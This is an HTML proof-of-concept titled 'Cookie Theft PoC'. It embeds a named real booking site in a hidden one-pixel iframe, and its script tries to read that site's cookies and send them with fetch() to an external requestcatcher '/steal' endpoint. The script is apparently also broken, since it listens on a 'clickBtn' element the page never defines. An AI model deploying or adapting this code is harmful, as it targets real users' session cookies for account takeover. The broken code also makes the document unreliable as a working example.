<!DOCTYPE html>
<html>

    <title>Cookie Theft PoC</title>

<body>

    <iframe src="https://hami.paziresh24.com" width="1" height="1" style="display:none;"></iframe>
    <script>
        document.getElementById('clickBtn').addEventListener('click', function (e) {
            e.preventDefault();
            const iframe = document.querySelector('iframe');
            try {
                const cookie = iframe.contentWindow.document.cookie;
                if (cookie) {
                    fetch('https://paziresh24.requestcatcher.com/steal?cookie=' + encodeURIComponent(cookie));
                    alert('Cookie sent!');
                } else {
                    alert('No cookie found (or HttpOnly)');
                }
            } catch (e) {
                alert('Error: ' + e.message);
            }
        });
    </script>
